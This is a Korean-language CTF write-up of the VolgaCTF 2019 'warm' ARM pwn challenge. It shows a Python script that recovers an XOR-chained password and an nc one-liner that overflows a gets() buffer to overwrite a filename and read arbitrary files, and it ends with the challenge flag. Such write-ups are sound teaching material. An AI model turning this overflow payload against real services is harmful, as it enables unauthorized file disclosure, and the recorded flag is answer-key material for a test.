---
layout: post
title: [volgaCTF 2019] warm
excerpt_separator: <!--more-->
tags:
  - Vertex
  - VolgaCTF2019
  - Write-up
---



# VolgaCTF2019 - warm

arm 바이너리로 되어있는 간단한 포너블 문제이다.



arm 명령어는 익숙치 않아서

hexray를 사용하고, 호출하는 함수 역할대로 네이밍을 해보면

![](https://i.imgur.com/Z8KZMMP.png)





선언된 내부 변수명 설정.

![](https://i.imgur.com/MsbflRq.png)



이 바이너리는

1. flag파일의 이름을 환경변수로부터 가져온다. 환경변수에 없으면 그냥 “flag”
2. 패스워드를 gets로 inputBuf[100]에 입력받는다. (버퍼오버플로우 발생)
3. 입력값을 chkPassword로 확인
4. filename에 들어있는 파일을 읽어서 화면에 뿌려줌.



gets에서는 버퍼오버플로우가 발생하는데, 이를 통해 inputBuf[100]을 넘겨서 filename을 덮어쓸 수 있습니다. 그럼 임의의 파일을 읽을 수 있습니다.



풀이 절차는

1. chkPassword 함수를 분석해 암호를 알아낸다.

 	2. 버퍼오버플로우를 이용해 flag파일을 읽는다. 또는 쉘을 얻어낸다.



## chkPassword 함수를 통해 암호 알아내기

![](https://i.imgur.com/Z9AVcMd.png)

상당히 노골적인(?) 암호 체크 함수입니다.

각 조건별로 (passChr[i] ^ passChr[i-1]) == ?? 형태이고, 

?? ^ passChr[i-1] 를 통해 passChr[i]의 값을 알아낼 수 있습니다.

passChr[0]은 85 ^ 0x23 즉 76입니다.

이 값을 이용해 연쇄적으로 모든 password를 알아낼 수 있습니다.



```python
key = [85,78,30,21,94,28,33,1,52,7,53,17,55,60,114,71]

passChr = 35 # 0x23

password = ""
for i in key:
    passChr = i ^ passChr
    password += chr(passChr)

print(password)
```

```
v8&3mqPQebWFqM?x
```





```
python -c "print('v8&3mqPQebWFqM?x');" | nc warm.q.2019.volgactf.ru 443 
```

\>>>

```
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?x
Seek file with something more sacred!
```





## flag 파일 읽기

BOF를 이용해 filename을 덮어쓸 수 있습니다.

inputBuf 크기가 100이고, 아까 구한 패스워드 크기가 16이므로,

```
( password ) + ( 84 크기 dummy ) + (읽을 파일명)
```



으로 페이로드를 짜면 됩니다.



아까 패스워드를 입력해서 환경변수로 등록된 flag파일의 내용이

```
Seek file with something more sacred!
```

였고, 다른 writeup들을 찾아본 결과 “sacred” 파일을 읽으면 된다네요.



``` sh
python -c "print('v8&3mqPQebWFqM?x'+'A'*84+'sacred');" | nc warm.q.2019.volgactf.ru 443 
```



이렇게 찾은 플래그는

```
VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle} 
```

